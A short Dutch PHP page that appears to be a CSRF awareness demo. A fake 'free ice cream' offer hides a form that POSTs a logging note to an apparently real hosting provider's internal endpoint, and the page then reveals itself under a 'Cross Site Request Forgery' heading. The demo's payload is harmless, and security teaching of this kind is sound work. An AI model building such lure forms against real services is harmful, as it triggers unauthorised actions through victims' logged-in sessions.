<?php
include('header.php');
?>
<h1>Gratis ijs</h1>
<p>
Bestel nu een gratis proefpakketje ijs. Klik op de knop en het ijs wordt direct bij je thuis bezorgd.
Adres invullen is niet nodig, we hebben contact met de NSA en een peloton helderzienden om er achter
te komen waar we het heen moeten sturen.
</p>
<form method="POST" action="https://office.byte.nl/include/byte-jslib/office/widget/bytelog_add.cgi">
<input type="hidden" name="json" value='{"class":"note","object":"frisseshizzle.nl","object_type":"domein","source":"quickscan","tag":"default","text":"Ik ben er in getrapt! Dit is gelogged in de quickscan middels CSRF."}' />
<input type="submit" value="Bestel gratis ijs">
</form>
<a href="https://office.byte.nl/quickscan/?domein=frisseshizzle.nl">qs</a>
<div style="margin: 10em;"></div>
<h1>Cross Site Request Forgery</h1>
<img src="csrf.png">


<?php
include('footer.php');
?>
